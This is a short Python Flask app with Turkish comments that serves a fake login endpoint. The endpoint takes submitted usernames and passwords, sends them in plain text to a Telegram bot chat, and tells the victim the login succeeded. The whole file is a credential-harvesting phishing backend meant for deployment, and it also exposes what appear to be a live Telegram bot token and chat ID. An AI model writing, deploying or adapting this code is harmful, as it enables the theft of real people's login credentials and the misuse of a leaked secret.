from flask import Flask, request
import requests
import os  # Çevre değişkenlerini okumak için

app = Flask(__name__)

# 🔹 Telegram Bilgileri (Render'da tanımlanacak!)
TOKEN = os.environ.get("7877952923:AAH45-_l94zL5JEY7fsSwiV3qRGR8jQ1Wbw")
CHAT_ID = os.environ.get("7107883815")

@app.route('/')
def home():
    return "Login Sayfası Çalışıyor!"

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return "Eksik bilgi!", 400

    # 📩 Telegram’a mesaj gönder
    message = f"📩 Yeni Giriş Bilgisi\n👤 Kullanıcı: {username}\n🔑 Şifre: {password}"
    send_to_telegram(message)

    return "Giriş başarılı!"

def send_to_telegram(message):
    if TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": message})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
